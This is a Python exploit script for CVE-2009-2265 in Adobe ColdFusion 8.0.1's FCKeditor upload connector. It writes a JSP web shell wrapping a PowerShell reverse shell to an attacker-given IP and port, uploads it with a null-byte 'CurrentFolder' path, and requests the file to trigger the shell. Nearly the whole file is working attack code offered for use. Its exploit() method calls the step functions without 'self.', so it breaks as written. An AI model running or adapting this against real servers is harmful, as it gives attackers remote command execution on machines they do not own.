import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2009-2265
# Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' file upload + RCE.
class CVE2009_2265:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    # generate payload with rev shell
    def generate_payload(self):
        print (LogColors.BLUE + "generate payload..." + LogColors.ENDC)
        payload = 'powershell -nop -exec bypass -c \\"'
        payload += "$client = New-Object System.Net.Sockets.TCPClient('" + self.lhost + "'," + self.lport+ ");"
        payload += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        payload += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"'
        webshell_jsp = '<%@ page import="java.util.*,java.io.*"%>'
        webshell_jsp += '<%'
        webshell_jsp += 'String name = "{}";'.format(payload)
        webshell_jsp += 'Process p;'
        webshell_jsp += 'p = Runtime.getRuntime().exec("cmd.exe /C " + name);'
        webshell_jsp += '%>'

        print (LogColors.YELLOW + "successfully generate web shell payload..." + LogColors.ENDC)
        try:
            with open("/tmp/hack.jsp", "w") as f:
                f.write(webshell_jsp)
                f.close()
        except Exception as e:
            print (LogColors.RED + "failed to generate payload file :(" + LogColors.ENDC)
            sys.exit()

    # upload payload. upload file with rev shell
    def upload_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        files = {
            'newfile': ('hack.txt', open('/tmp/hack.jsp', 'rb'), 'application/x-java-archive')
        }
        data = "Command=FileUpload&Type=File&CurrentFolder=/hack.jsp%00"
        r = self.session.post(self.url + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm", files = files, params = data)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()

    # get rev shell
    def trigger_shell(self):
        print (LogColors.BLUE + "trigger rev shell..." + LogColors.ENDC)
        try:
            self.session.get(self.url + "/userfiles/file/hack.jsp")
        except Exception as e:
            print (LogColors.RED + "failed to get rev shell..." + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully get rev shell :)" + LogColors.ENDC)

    # exploitation logic
    def exploit(self):
        generate_payload()
        upload_payload()
        trigger_shell()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    ip, port = args['ip'], args['port']
    cve = CVE2009_2265(url, ip, port)
    cve.exploit()

